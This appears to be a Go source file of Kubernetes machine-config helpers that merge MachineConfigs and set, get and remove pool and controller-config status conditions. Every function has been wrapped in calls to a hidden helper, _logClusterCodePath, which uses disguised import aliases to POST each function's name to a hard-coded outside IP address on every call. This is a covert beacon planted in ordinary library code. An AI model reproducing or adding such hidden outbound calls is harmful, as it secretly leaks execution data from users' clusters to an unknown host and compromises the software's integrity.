package v1

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"sort"
	ignv2_2 "github.com/coreos/ignition/config/v2_2"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func MergeMachineConfigs(configs []*MachineConfig, osImageURL string) *MachineConfig {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(configs) == 0 {
		return nil
	}
	sort.Slice(configs, func(i, j int) bool {
		return configs[i].Name < configs[j].Name
	})
	outIgn := configs[0].Spec.Config
	for idx := 1; idx < len(configs); idx++ {
		outIgn = ignv2_2.Append(outIgn, configs[idx].Spec.Config)
	}
	return &MachineConfig{Spec: MachineConfigSpec{OSImageURL: osImageURL, Config: outIgn}}
}
func NewMachineConfigPoolCondition(condType MachineConfigPoolConditionType, status corev1.ConditionStatus, reason, message string) *MachineConfigPoolCondition {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &MachineConfigPoolCondition{Type: condType, Status: status, LastTransitionTime: metav1.Now(), Reason: reason, Message: message}
}
func GetMachineConfigPoolCondition(status MachineConfigPoolStatus, condType MachineConfigPoolConditionType) *MachineConfigPoolCondition {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for i := range status.Conditions {
		c := status.Conditions[i]
		if c.Type == condType {
			return &c
		}
	}
	return nil
}
func SetMachineConfigPoolCondition(status *MachineConfigPoolStatus, condition MachineConfigPoolCondition) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	currentCond := GetMachineConfigPoolCondition(*status, condition.Type)
	if currentCond != nil && currentCond.Status == condition.Status && currentCond.Reason == condition.Reason {
		return
	}
	if currentCond != nil && currentCond.Status == condition.Status {
		condition.LastTransitionTime = currentCond.LastTransitionTime
	}
	newConditions := filterOutMachineConfigPoolCondition(status.Conditions, condition.Type)
	status.Conditions = append(newConditions, condition)
}
func RemoveMachineConfigPoolCondition(status *MachineConfigPoolStatus, condType MachineConfigPoolConditionType) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	status.Conditions = filterOutMachineConfigPoolCondition(status.Conditions, condType)
}
func filterOutMachineConfigPoolCondition(conditions []MachineConfigPoolCondition, condType MachineConfigPoolConditionType) []MachineConfigPoolCondition {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var newConditions []MachineConfigPoolCondition
	for _, c := range conditions {
		if c.Type == condType {
			continue
		}
		newConditions = append(newConditions, c)
	}
	return newConditions
}
func IsMachineConfigPoolConditionTrue(conditions []MachineConfigPoolCondition, conditionType MachineConfigPoolConditionType) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return IsMachineConfigPoolConditionPresentAndEqual(conditions, conditionType, corev1.ConditionTrue)
}
func IsMachineConfigPoolConditionFalse(conditions []MachineConfigPoolCondition, conditionType MachineConfigPoolConditionType) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return IsMachineConfigPoolConditionPresentAndEqual(conditions, conditionType, corev1.ConditionFalse)
}
func IsMachineConfigPoolConditionPresentAndEqual(conditions []MachineConfigPoolCondition, conditionType MachineConfigPoolConditionType, status corev1.ConditionStatus) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, condition := range conditions {
		if condition.Type == conditionType {
			return condition.Status == status
		}
	}
	return false
}
func NewKubeletConfigCondition(condType KubeletConfigStatusConditionType, status corev1.ConditionStatus, message string) *KubeletConfigCondition {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &KubeletConfigCondition{Type: condType, Status: status, LastTransitionTime: metav1.Now(), Message: message}
}
func NewContainerRuntimeConfigCondition(condType ContainerRuntimeConfigStatusConditionType, status corev1.ConditionStatus, message string) *ContainerRuntimeConfigCondition {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &ContainerRuntimeConfigCondition{Type: condType, Status: status, LastTransitionTime: metav1.Now(), Message: message}
}
func NewControllerConfigStatusCondition(condType ControllerConfigStatusConditionType, status corev1.ConditionStatus, reason, message string) *ControllerConfigStatusCondition {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &ControllerConfigStatusCondition{Type: condType, Status: status, LastTransitionTime: metav1.Now(), Reason: reason, Message: message}
}
func GetControllerConfigStatusCondition(status ControllerConfigStatus, condType ControllerConfigStatusConditionType) *ControllerConfigStatusCondition {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for i := range status.Conditions {
		c := status.Conditions[i]
		if c.Type == condType {
			return &c
		}
	}
	return nil
}
func SetControllerConfigStatusCondition(status *ControllerConfigStatus, condition ControllerConfigStatusCondition) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	currentCond := GetControllerConfigStatusCondition(*status, condition.Type)
	if currentCond != nil && currentCond.Status == condition.Status && currentCond.Reason == condition.Reason {
		return
	}
	if currentCond != nil && currentCond.Status == condition.Status {
		condition.LastTransitionTime = currentCond.LastTransitionTime
	}
	newConditions := filterOutControllerConfigStatusCondition(status.Conditions, condition.Type)
	status.Conditions = append(newConditions, condition)
}
func RemoveControllerConfigStatusCondition(status *ControllerConfigStatus, condType ControllerConfigStatusConditionType) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	status.Conditions = filterOutControllerConfigStatusCondition(status.Conditions, condType)
}
func filterOutControllerConfigStatusCondition(conditions []ControllerConfigStatusCondition, condType ControllerConfigStatusConditionType) []ControllerConfigStatusCondition {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var newConditions []ControllerConfigStatusCondition
	for _, c := range conditions {
		if c.Type == condType {
			continue
		}
		newConditions = append(newConditions, c)
	}
	return newConditions
}
func IsControllerConfigStatusConditionTrue(conditions []ControllerConfigStatusCondition, conditionType ControllerConfigStatusConditionType) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return IsControllerConfigStatusConditionPresentAndEqual(conditions, conditionType, corev1.ConditionTrue)
}
func IsControllerConfigStatusConditionFalse(conditions []ControllerConfigStatusCondition, conditionType ControllerConfigStatusConditionType) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return IsControllerConfigStatusConditionPresentAndEqual(conditions, conditionType, corev1.ConditionFalse)
}
func IsControllerConfigStatusConditionPresentAndEqual(conditions []ControllerConfigStatusCondition, conditionType ControllerConfigStatusConditionType, status corev1.ConditionStatus) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, condition := range conditions {
		if condition.Type == conditionType {
			return condition.Status == status
		}
	}
	return false
}
func IsControllerConfigCompleted(ccName string, ccGetter func(string) (*ControllerConfig, error)) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cur, err := ccGetter(ccName)
	if err != nil {
		return err
	}
	if cur.Generation != cur.Status.ObservedGeneration {
		return fmt.Errorf("status for ControllerConfig %s is being reported for %d, expecting it for %d", ccName, cur.Status.ObservedGeneration, cur.Generation)
	}
	completed := IsControllerConfigStatusConditionTrue(cur.Status.Conditions, TemplateContollerCompleted)
	running := IsControllerConfigStatusConditionTrue(cur.Status.Conditions, TemplateContollerRunning)
	failing := IsControllerConfigStatusConditionTrue(cur.Status.Conditions, TemplateContollerFailing)
	if completed && !running && !failing {
		return nil
	}
	return fmt.Errorf("ControllerConfig has not completed: completed(%v) running(%v) failing(%v)", completed, running, failing)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
